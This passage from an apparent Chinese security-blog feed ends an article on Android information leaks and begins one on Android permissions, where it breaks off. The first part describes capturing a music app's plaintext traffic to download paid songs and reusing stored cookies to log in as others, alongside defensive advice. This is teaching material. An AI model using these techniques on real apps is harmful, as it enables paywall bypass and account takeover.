id="（2）漏洞案例——XX音乐存在任意文件下载漏洞"><a href="#（2）漏洞案例——XX音乐存在任意文件下载漏洞" class="headerlink" title="（2）漏洞案例——XX音乐存在任意文件下载漏洞"></a>（2）漏洞案例——XX音乐存在任意文件下载漏洞</h4><p>这段时间我查看了一下国内主流的音乐软件平台，发现很多音乐软件都存在http明文传输的问题，这样势必会导致升级劫持、信息泄露、任意文件下载等等漏洞，这里我们列举一个有http明文泄露导致的任意文件下载问题</p><p>首先我们随便选择几首需要VIP下载的歌曲</p><p>等他</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/25.png" alt="image-20220104164309655"></p><p>我们发现这些音乐都需要开通VIP才能下载</p><p>接下来我们用抓包软件抓取</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/27.png" alt="image-20220104164309655"></p><p>我们发现了音乐的url，我们直接访问，发现可以直接下载</p><p>还有一些http明文传输漏洞导致任意登录，一些APP也会把登录成功的Cookie保存在本地，那么只要找到相关文件复制下来这个Cookie，就可以任意登录了。</p><h4 id="（3）安全防护-4"><a href="#（3）安全防护-4" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><p>防护建议：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>采用https加密传输</span><br><span class="line"><span class="number">2.</span>敏感信息使用http传输，那么对敏感信息进行加密，并且使用非对称加密，或者公认的强加密算法</span><br><span class="line"><span class="number">3.</span>对以下字段进行加密处理：密码、手机号、快捷支付手机号、Email、身份证、银行卡、CVV码、有效期等</span><br></pre></td></tr></table></figure><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文对Android App中信息泄露漏洞的常见形式做了一个基本的讲述，当然实际过程中很多APP的信息泄露漏洞可能要比这个复杂，这里只是初步的为大家介绍一下信息泄露漏洞的基础知识，本文的样例我会上传到github上，这里放一个传送门：</p><p><a href="https://github.com/guoxuaa/Android-Vulnerability-Mining">github地址</a></p><h2 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h2><p>文件存储：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://juejin.cn/post/6844903778227847182#heading-10</span><br><span class="line">https://juejin.cn/post/6844904013515718664#heading-6</span><br></pre></td></tr></table></figure><p>其他存储：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/536ca489a7f4</span><br><span class="line">https://cloud.tencent.com/developer/article/1045171</span><br></pre></td></tr></table></figure><p>网络存储：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/doodle777/p/4937594.html</span><br><span class="line">https://blog.csdn.net/weixin_43689040/article/details/103761411</span><br></pre></td></tr></table></figure><p>漏洞挖掘参考：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.anquanke.com/post/id/84603</span></span><br><span class="line">https:<span class="comment">//www.anquanke.com/post/id/86057</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;好久没有更新帖子了，最近一直都比较忙，这里首先祝大家腊八节快乐。本文主要围绕Android APP漏洞中的信息泄露漏洞展开描述，因为挖掘Android APP信息泄露漏洞的思路各有差异，所以本文只是基于Android APP中较为基础的信息泄露的漏洞实例开始讲述。&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（13）——权限安全和安全配置漏洞详解</title>
    <link href="http://security-kitchen.com/2023/02/13/bug0013/"/>
    <id>http://security-kitchen.com/2023/02/13/bug0013/</id>
    <published>2023-02-13T01:11:19.000Z</published>
    <updated>2023-12-23T09:13:44.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>前几篇帖子我们将Android的四大组件中漏洞做了一个具体的介绍，本节我们将进一步介绍Android中的权限配置相关的漏洞以及Android安全配置漏洞，因为权限配置往往和组件关联性很大，所以大家可以结合前几篇帖子来看。2017年权限漏洞仍占据漏洞榜单的第三名，但随着近几年的快速发展，开发人员开始不断注意对权限的安全设置，权限漏洞已经逐渐减少了。</p><span id="more"></span><p>本文第二节主要讲述Android权限机制，以及Android中权限所涉及的安全问题</p><p>本文第三节主要讲述权限安全漏洞的原理和拿两个案例复现相关的权限漏洞，并给出了相应的防护方案</p><p>本文第四节主要介绍Android中的安全配置问题，梳理了AndroidManifest.xml的结构注册，并讲解了相关的配置安全问题</p><p>本文第五节主要复现和详细介绍了Android安全配置中的漏洞问题</p><h2 id="二、Android权限机制介绍"><a href="#二、Android权限机制介绍" class="headerlink" title="二、Android权限机制介绍"></a>二、Android权限机制介绍</h2><h3 id="1-Android权限"><a href="#1-Android权限" class="headerlink" title="1. Android权限"></a>1. Android权限</h3><h4 id="（1）Android权限原理"><a href="#（1）Android权限原理" class="headerlink" title="（1）Android权限原理"></a>（1）Android权限原理</h4><p>Android设置权限主要是为了保护Android用户的隐私，根据功能不同，系统会授予不同的权限，而对于用户的一些敏感数据，用户必须要申请权限之后才能访问，具体的示意图如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/1.png" alt="image-20211025162212783"></p><h4 id="（2）Android权限的分类"><a href="#（2）Android权限的分类" class="headerlink" title="（2）Android权限的分类"></a>（2）Android权限的分类</h4><p>从官方的文档中，我们可以知道Android将权限分为：<code>安装时权限、运行时权限和特殊权限</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)安装时权限：用户在安装应用程序时，应用程序会向用户申请的基本权限，这类权限一般被分配为：普通权限和签名权限</span><br><span class="line">(<span class="number">2</span>)运行时权限：Android6<span class="number">.0</span>之后，Android中加入了运行时权限，应用程序在运行过程中需要访问一些敏感数据，需要向用户请求权限，这类权限被分配为：危险权限</span><br><span class="line">(<span class="number">3</span>)特殊权限：只有平台和原始设备制造商（OEM）可以定义，为了执行特定的操作而申请的权限，这类权限被分配为：保护权限</span><br></pre></td></tr></table></figure><p>我们从上文中可以知道Android 6.0是一个重要节点，所以下面我们以此为界详细的描述权限的变化情况，权限的API参考：<a href="https://developer.android.com/reference/android/Manifest.permission?hl=zh-cn">权限API列表</a></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/2.png" alt="image-20211025170220085"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">危险权限的处理：</span><br><span class="line">（1）Android 6.0之前应用程序会在程序安装时申请全部危险权限，一些应用可能用户不授权就无法成功安装，存在很大的安全风险</span><br><span class="line">（2）Android 6.0之后应用程序在使用危险权限时，需要向用户动态申请</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正常权限：manifest文件声明即可使用，安装apk时授予，app运行时不在提示</span><br><span class="line">危险权限：涉及到用户隐私，用户数据相关的权限，manifest声明，代码中还要动态申请</span><br></pre></td></tr></table></figure><h4 id="（3）权限组"><a href="#（3）权限组" class="headerlink" title="（3）权限组"></a>（3）权限组</h4><p>Android系统对所有的<code>危险权限</code>进行了分组，称为权限组</p><table><thead><tr><th align="left"><strong>权限组</strong></th><th>权限</th></tr></thead><tbody><tr><td align="left">CALENDAR</td><td>READ_CALENDAR<br/>WRITE_CALENDAR</td></tr><tr><td align="left">CAMERA</td><td>CAMERA</td></tr><tr><td align="left">CONTACTS</td><td>READ_CONTACTS<br/>WRITE_CONTACTS<br/>GET_ACCOUNTS</td></tr><tr><td align="left">LOCATION</td><td>ACCESS_FINE_LOCATION<br/>ACCESS_COARSE_LOCATION</td></tr><tr><td align="left">MICROPHONE</td><td>RECORD_AUDIO</td></tr><tr><td align="left">PHONE</td><td>READ_PHONE_STATE<br/>CALL_PHONE<br/>READ_CALL_LOG<br/>WRITE_CALL_LOG<br/>ADD_VOICEMAIL<br/>USE_SIP<br/>PROCESS_OUTGOING_CALLS</td></tr><tr><td align="left">SENSORS</td><td>BODY_SENSORS</td></tr><tr><td align="left">SMS</td><td>SEND_SMS<br/>RECEIVE_SMS<br/>READ_SMS<br/>RECEIVE_WAP_PUSH<br/>RECEIVE_MMS</td></tr><tr><td align="left">STORAGE</td><td>READ_EXTERNAL_STORAGE<br/>WRITE_EXTERNAL_STORAGE</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">权限组的区别：</span><br><span class="line">（1）Android 6.0-8.0：用户只要同意权限组的任意一个权限，用户则会获得此权限组的所有权限</span><br><span class="line">（2）Android 9.0及以后: 用户申请某个组内的一个权限，系统不会给同组内的其他权限，用户申请哪个，系统就给哪个</span><br></pre></td></tr></table></figure><h4 id="（4）如何请求权限"><a href="#（4）如何请求权限" class="headerlink" title="（4）如何请求权限"></a>（4）如何请求权限</h4><h5 id="lt-1-gt-向清单文件中添加权限"><a href="#lt-1-gt-向清单文件中添加权限" class="headerlink" title="&lt;1&gt;向清单文件中添加权限"></a>&lt;1&gt;向清单文件中添加权限</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.ceco.r.gravitybox&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:versionCode</span>=<span class="string">&quot;1105&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:versionName</span>=<span class="string">&quot;11.0.5&quot;</span> &gt;</span></span><br><span class="line">    //声明权限</span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_SYNC_SETTINGS&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_SYNC_SETTINGS&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>无论应用需要什么权限，都需要在清单文件中对权限声明，系统会根据权限的等级来采取不同的操作，对不同的权限，系统会在安装应用时立即授予这些权限，对于危险权限，则需要用户明确授权才能获得</p><h5 id="lt-2-gt-运行时申请权限"><a href="#lt-2-gt-运行时申请权限" class="headerlink" title="&lt;2&gt;运行时申请权限"></a>&lt;2&gt;运行时申请权限</h5><p>申请权限的常用步骤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">权限申请步骤：</span><br><span class="line"><span class="number">1.</span>检查有无权限</span><br><span class="line">有权限——&gt;运行</span><br><span class="line">无权限——&gt;申请权限</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>申请权限（走权限回调）</span><br><span class="line">用户同意——&gt;运行</span><br><span class="line">用户拒绝——&gt;展示跳转设置界面对话框</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>跳转设置对话框</span><br><span class="line">同意跳转——&gt;跳转特定的权限打开界面</span><br><span class="line">用户拒绝——&gt;Toast提示没权限，功能不能正常使用</span><br></pre></td></tr></table></figure><p><strong>检查有无权限：</strong></p><p>应用程序需要一项危险权限，每次执行需要危险权限的操作时，都必须检查自己是否具有该权限，Android 6.0开始，用户可以1随时从任何应用撤销权限，即便应用以较低的API为目标平台，检查应用是否具备某项权限，调用<code>ContextCompat.checkSelfPermission()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ContextCompat.checkSelfPermission方法：检查是否具有某项权限 </span><br><span class="line">参数<span class="number">1</span>：Context 参数<span class="number">2</span>：权限名    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (ContextCompat.checkSelfPermission(thisActivity, Manifest.permission.WRITE_CALENDAR)</span><br><span class="line">            != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">        <span class="comment">// 权限没有被授予</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>申请权限：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ActivityCompat.requestPermissions方法：</span><br><span class="line">参数<span class="number">1</span>：activity  参数<span class="number">2</span>：要申请权限的字符串数组  参数<span class="number">3</span>：请求码</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ContextCompat.checkSelfPermission(thisActivity, Manifest.permission.WRITE_CALENDAR)</span><br><span class="line">            != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">        <span class="comment">// 权限没有被授予，申请权限</span></span><br><span class="line">        ActivityCompat.requestPermissions(thisActivity,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;Manifest.permission.READ_CONTACTS&#125;,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）requestPermissions执行时会弹系统对话框申请相关的权限。用户可以选择同意授权，或者拒绝授权。对话框关闭之后就走Activity的onRequestPermissionsResult回调了</span><br><span class="line">（<span class="number">2</span>）请求危险权限，之前需要在清单文件声明，否则对话框不弹，直接就是用户拒绝这个权限</span><br><span class="line">（<span class="number">3</span>）总之，只要使用权限就必须清单文件先声明，只是危险权限还需要动态申请</span><br></pre></td></tr></table></figure><p><strong>对话框关闭后，请求回调:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">onRequestPermissionsResult方法：</span><br><span class="line">参数<span class="number">1</span>：请求码 参数<span class="number">2</span>：请求的权限 参数<span class="number">3</span>：授权结果数组</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onRequestPermissionsResult</span><span class="params">(<span class="type">int</span> requestCode, <span class="meta">@NonNull</span> String[] permissions,</span></span><br><span class="line"><span class="params">            <span class="meta">@NonNull</span> <span class="type">int</span>[] grantResults)</span>&#123;</span><br><span class="line">            <span class="keyword">switch</span>(requestCode)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span>(grantResults.length&gt;<span class="number">0</span> &amp;&amp; grantResults[<span class="number">0</span>] == PackageManager.PERMISSION_GRANTED)&#123;</span><br><span class="line">                        call();</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="comment">//你没有授权</span></span><br><span class="line">                        Toast.makeText(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;你没有授权！&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">回调函数，你授权后就会执行call(),你没有授权就会提示没有权限</span><br></pre></td></tr></table></figure><h4 id="（5）自定义权限"><a href="#（5）自定义权限" class="headerlink" title="（5）自定义权限"></a>（5）自定义权限</h4><p>Android中应用程序可以自定义权限来提供给其他程序访问自己的功能</p><h5 id="lt-1-gt-如何定义自定义权限"><a href="#lt-1-gt-如何定义自定义权限" class="headerlink" title="&lt;1&gt; 如何定义自定义权限"></a>&lt;1&gt; 如何定义自定义权限</h5><p>我们要定义自定义权限，需要在<code>AndroidManifest.xml</code>中使用<code>&lt;permission&gt;</code>来声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">package</span>=<span class="string">&quot;com.example.test&quot;</span> &gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">permission</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:name</span>=<span class="string">&quot;com.example.myapp.permission.DEADLY_ACTIVITY&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:label</span>=<span class="string">&quot;@string/permlab_deadlyActivity&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:description</span>=<span class="string">&quot;@string/permdesc_deadlyActivity&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:permissionGroup</span>=<span class="string">&quot;android.permission-group.COST_MONEY&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:protectionLevel</span>=<span class="string">&quot;dangerous&quot;</span> /&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">属性说明：</span><br><span class="line">(<span class="number">1</span>)name：自定义权限的名字，其他app引用的名字</span><br><span class="line">(<span class="number">2</span>)lable：标签，用于描述该权限保护的关键功能,显示给用户的，它的值可是一个 string 数据</span><br><span class="line">(<span class="number">3</span>)description：描述，比 label 更长的对权限的描述。值是通过 resource 文件中获取的，不能直接写 string 值。</span><br><span class="line">(<span class="number">4</span>)permissionGroup：权限组，可选属性。在大多数情况下，应该将其设置为一个标准系统组（android.Manifest.permission_group），尽管可以自己定义一个组。</span><br><span class="line">(<span class="number">5</span>)protectionLevel：权限的等级，必须的属性</span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-自定义权限使用"><a href="#lt-2-gt-自定义权限使用" class="headerlink" title="&lt;2&gt;自定义权限使用"></a>&lt;2&gt;自定义权限使用</h5><p>我们先在进程1中定义自定义权限：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;manifest xmlns:android=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="line">    <span class="keyword">package</span>=<span class="string">&quot;com.example.test&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义的权限，权限级别为 normal</span></span><br><span class="line">    &lt;permission</span><br><span class="line">        android:name=<span class="string">&quot;com.example.test.permission.SECOND_ACTIVITY&quot;</span></span><br><span class="line">        android:label=<span class="string">&quot;abc&quot;</span></span><br><span class="line">        android:description=<span class="string">&quot;@string/permdesc_SecondActivity&quot;</span></span><br><span class="line">        android:permissionGroup=<span class="string">&quot;android.permission-group.COST_MONEY&quot;</span></span><br><span class="line">        android:protectionLevel=<span class="string">&quot;normal&quot;</span> /&gt;</span><br><span class="line">            &lt;application</span><br><span class="line">        android:allowBackup=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:icon=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span><br><span class="line">        android:label=<span class="string">&quot;@string/app_name&quot;</span></span><br><span class="line">        android:roundIcon=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span></span><br><span class="line">        android:supportsRtl=<span class="string">&quot;true&quot;</span></span><br><span class="line">        android:theme=<span class="string">&quot;@style/AppTheme&quot;</span>&gt;</span><br><span class="line">        <span class="comment">//为SecondActivity加上android:permission=&quot;com.example.myapp.permission.SECOND_ACTIVITY&quot;</span></span><br><span class="line">        &lt;activity</span><br><span class="line">            android:name=<span class="string">&quot;.SecondActivity&quot;</span></span><br><span class="line">            android:exported=<span class="string">&quot;true&quot;</span></span><br><span class="line">            android:permission=<span class="string">&quot;com.example.test.permission.SECOND_ACTIVITY&quot;</span>&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=<span class="string">&quot;com.example.jump&quot;</span> /&gt;</span><br><span class="line">                &lt;category android:name=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">......</span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure><p>然后我们在进程2中声明该自定义权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.example.test&quot;</span>&gt;</span></span><br><span class="line">//在AndroidManifest中声明权限</span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.test.permission.SECOND_ACTIVITY&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>在进程2的MainActivity中编写代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.example.jump&quot;</span>);</span><br><span class="line">intent.addCategory(Intent.CATEGORY_DEFAULT);</span><br><span class="line"><span class="keyword">if</span> (intent.resolveActivity(getPackageManager()) != <span class="literal">null</span>) &#123;</span><br><span class="line">startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就可以顺利从进程2跳转到进程1</p><h5 id="lt-3-gt-自定义权限注意点"><a href="#lt-3-gt-自定义权限注意点" class="headerlink" title="&lt;3&gt;自定义权限注意点"></a>&lt;3&gt;自定义权限注意点</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）两个应用声明了相同的权限？</span><br><span class="line">Android不允许两个不同的应用定义一个相同名字的权限（除非这两个应用拥有相同签名），所以最好不要命名相同</span><br><span class="line">（<span class="number">2</span>）应用安装的顺序关系</span><br><span class="line">场景：APP A中声明了权限permission A，APP B中使用了权限permissionA</span><br><span class="line">情况<span class="number">1</span>：PermissionA的保护级别是normal或者dangerous，只能App A先安装，App B后安装，从App B打开App A一切正常，否则报错</span><br><span class="line">情况<span class="number">2</span>：PermissionA的保护级别是signature或者signatureOrSystem</span><br><span class="line">      App B先安装，App A后安装，如果App A和App B是相同的签名，那么App B可以获取到PermissionA的权限</span><br><span class="line">      如果App A和App B的签名不同，则App B获取不到PermissionA权限</span><br><span class="line">      对于相同签名的app来说，不论安装先后，只要是声明了权限，请求该权限的app就会获得该权限</span><br><span class="line">情况<span class="number">3</span>:android:protectionLevel会影响权限在Android6<span class="number">.0</span>+系统的使用</span><br><span class="line"> android:protectionLevel=<span class="string">&quot;normal&quot;</span>，不需要动态申请 </span><br><span class="line"> android:protectionLevel=<span class="string">&quot;dangerous&quot;</span>，需要动态申请</span><br></pre></td></tr></table></figure><h3 id="2-权限安全种类和危害"><a href="#2-权限安全种类和危害" class="headerlink" title="2.权限安全种类和危害"></a>2.权限安全种类和危害</h3><p><strong>权限漏洞种类：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0013/3.png" alt="image-20211026104832302"></p><p><strong>安全场景：</strong></p><p>我们通过上面的分析，可以发现大部分权限安全的场景都发生在保护级别设置不当，自定义权限中如果权限控制不当，往往就会导致各种越权等安全问题的发生。我们再次看一下自定义权限的结构：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:permissionGroup</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">     <span class="attr">android:protectionLevel</span>=<span class="string">[</span>&quot;<span class="attr">normal</span>&quot;|&quot;<span class="attr">dangerous</span>&quot;|&quot;<span class="attr">signature</span>&quot;|&quot;<span class="attr">signatureOrSystem</span>&quot; /&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Normal:最低等级，系统会默认授予次权限，不会提示用户，低风险，所以的APP不能访问和共享此APP</span><br><span class="line">Dangerous:系统在安装时声明此类权限的app会提示用户，是高风险，所以APP都能访问和共享此APP</span><br><span class="line">Signature:权限表明的操作只针对使用同一个证书签名的app开放，是指具有相同签名的APP可以访问和共享此APP</span><br><span class="line">SignatureOrSystem:系统images中APP和具有相同签名的APP可以访问和共享此APP,google建议不使用该选项，一般用于特定的一些功能</span><br></pre></td></tr></table></figure><h2 id="三、权限安全漏洞原理分析和复现"><a href="#三、权限安全漏洞原理分析和复现" class="headerlink" title="三、权限安全漏洞原理分析和复现"></a>三、权限安全漏洞原理分析和复现</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" 